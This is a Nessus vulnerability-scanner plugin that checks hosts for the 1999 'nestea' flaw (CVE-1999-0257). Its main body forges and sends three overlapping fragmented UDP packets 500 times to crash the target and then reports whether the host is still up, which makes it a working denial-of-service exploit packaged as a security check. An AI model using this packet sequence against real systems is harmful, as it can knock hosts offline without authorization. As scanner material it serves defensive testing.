#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10148);
 script_version ("$Revision: 1.20 $");

 script_cve_id("CVE-1999-0257");
 script_bugtraq_id(7219);
 script_xref(name:"OSVDB", value:"5729");

 name["english"] = "Nestea";
 name["francais"] = "Nestea";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
It was possible to make the remote server crash using the 'nestea'
attack. 

An attacker may use this flaw to shut down this server, thus
preventing your network from working properly

Solution : contact your operating system vendor for a patch. 

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes the remote host using the 'nestea' attack";
 summary["francais"] = "Tue le serveur distant en utilisant l'attaque 'nestea'";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 1999 Renaud Deraison",
		francais:"Ce script est Copyright (C) 1999 Renaud Deraison");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);

 
 exit(0);
}

#
# The script code starts here
#

start_denial();


# Don't read back the answers


# Our "constants"
MAGIC = 108;
IPH   = 20;
UDPH  = 8;
PADDING = 256;
IP_ID = 242;
sport = 123;
dport = 137;

ip = forge_ip_packet(ip_v : 4,
		     ip_hl : 5,
		     ip_tos : 0,
		     ip_id  : IP_ID,
		     ip_len : IPH + UDPH + 10,
		     ip_off : 0|IP_MF,
		     ip_p   : IPPROTO_UDP,
		     ip_src : this_host(),
		     ip_ttl : 0x40);
# Forge the first udp packet		     
udp1 = forge_udp_packet(ip : ip,
			uh_sport : sport,
			uh_dport : dport,
			uh_ulen : UDPH + 10);
			
# Change some params in the ip packet				     
ip = set_ip_elements(ip:ip, ip_len : IPH + UDPH + MAGIC,
		       ip_off : 6);

# Forge the second udp packet		     
udp2 = 	forge_udp_packet(ip : ip,
			uh_sport : sport,
			uh_dport : dport,
			uh_ulen : UDPH + MAGIC);

# Change some params one more
ip = set_ip_elements(ip : ip, ip_len : IPH + UDPH + PADDING + 40,
	        ip_off : 0|IP_MF);
		
# data = 'XXX.....XX'	
	
data = crap(PADDING);
# Forge the third udp packet		      
udp3 = 	forge_udp_packet(ip : ip,
			uh_sport : sport,
			uh_dport : dport,
			uh_ulen : UDPH + PADDING,
			data : data);
			
# Send our udp packets 500 times							      
send_packet(udp1, udp2, udp3, pcap_active:FALSE) x 500;
 
sleep(5);
alive = end_denial();
if(!alive){
                set_kb_item(name:"Host/dead", value:TRUE);
                security_hole(port:0, protocol:"udp");
                }
